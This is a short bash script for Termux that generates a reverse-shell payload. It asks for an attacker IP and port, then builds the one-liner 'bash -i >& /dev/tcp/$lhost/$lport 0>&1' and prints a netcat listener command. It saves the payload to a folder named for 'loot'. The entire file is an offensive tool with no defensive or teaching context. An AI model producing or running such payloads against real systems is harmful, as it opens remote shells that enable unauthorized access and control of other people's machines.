
#!/data/data/com.termux/files/usr/bin/bash

echo "[+] Simple Reverse Shell Generator"
read -p "Enter LHOST (your IP): " lhost
read -p "Enter LPORT (your port, default 4444): " lport

lport=${lport:-4444}

payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1"

echo "[+] Reverse Shell Command:"
echo "$payload"

echo "[+] Recommended listener (on your machine):"
echo "nc -lvnp $lport"

echo "[+] Saving to ~/Kydras_Loot/payloads/reverse-shell.txt"
mkdir -p ~/Kydras_Loot/payloads
echo "$payload" > ~/Kydras_Loot/payloads/reverse-shell.txt
